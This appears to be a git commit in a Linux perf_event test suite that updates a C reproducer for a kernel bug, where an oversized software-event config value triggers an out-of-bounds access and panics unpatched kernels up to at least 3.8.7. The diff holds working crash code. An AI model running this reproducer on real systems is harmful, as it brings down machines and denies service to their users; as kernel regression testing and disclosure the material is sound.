dd29e6425a90242b306eb737cd9752a39757d7ef
Vince Weaver <vincent.weaver@maine.edu>
2013-04-15 15:52:50 -0400

    Update the sw_event_config_overflow crash
    Now it actually does panic the machine.

--- crashes/sw_event_config_overflow.c
+++ crashes/sw_event_config_overflow.c
@@ -6,13 +6,17 @@
 /* passed by user space, resulting to out-of-bounds access of the      */
 /* perf_swevent_enabled array in sw_perf_event_destroy().              */
 
-/* [PATCH] perf: treat attr.config as u64 in perf_swevent_init()       */
-
-
 /* Introduced in commit b0a873ebb ("perf: Register PMU implementations"). */
+
+/* Patch that fixes is:                                                */
+/* [PATCH] perf: treat attr.config as u64 in perf_swevent_init()       */
+/* vulnerable through at least 3.8.7                                   */
+
 
 #include <stdio.h>
 #include <unistd.h>
+#include <errno.h>
+#include <string.h>
 
 #include "perf_event.h"
 #include "perf_helpers.h"
@@ -25,14 +29,18 @@ int main(void) {
 
    printf("On unpatched kernels this will cause a panic.\n\n");
 
-   pe.type = PERF_TYPE_SOFTWARE;
-   pe.size = sizeof(struct perf_event_attr),
-   pe.config = 0x00000000ffffffff,
+   memset(&pe,0,sizeof(struct perf_event_attr));
 
-   fd=perf_event_open(&pe,getpid(),-1,-1,0);
+   pe.type = PERF_TYPE_SOFTWARE;
+   pe.size = sizeof(struct perf_event_attr);
+   pe.config = 0x00000000ffffffffULL;
+   //pe.config = PERF_COUNT_SW_CPU_CLOCK;
+
+   fd=perf_event_open(&pe,0,-1,-1,0);
    if (fd>0) {
       printf("Unexpectedly able to open that.\n");
    }
+   //printf("Return %d errno %d: %s\n",fd,errno,strerror(errno));
 
    return 0;
 }
